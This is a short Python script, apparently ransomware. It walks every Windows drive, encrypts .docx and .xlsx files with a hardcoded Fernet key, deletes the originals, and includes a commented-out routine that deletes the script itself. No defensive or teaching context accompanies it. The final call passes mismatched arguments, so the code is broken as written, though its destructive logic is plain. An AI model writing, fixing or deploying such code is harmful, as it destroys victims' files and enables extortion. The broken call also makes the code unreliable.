import os
from cryptography.fernet import Fernet

def encrypt_files(key, extension):
    f = Fernet(key)
    for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive_path = f'{drive}:\\'
        if os.path.exists(drive_path):
            for root, dirs, files in os.walk(drive_path):
                for file in files:
                    if any(file.endswith(ext) for ext in extension):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f1:
                            data = f1.read()
                        encrypted_data = f.encrypt(data)
                        with open(file_path + '.enc', 'wb') as f2:
                            f2.write(encrypted_data)
                        os.remove(file_path)

key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='

path = r''
extension = ('.docx', '.xlsx')

encrypt_files(path, key, extension)

def delete_script():
    os.remove(__file__)

#delete_script()
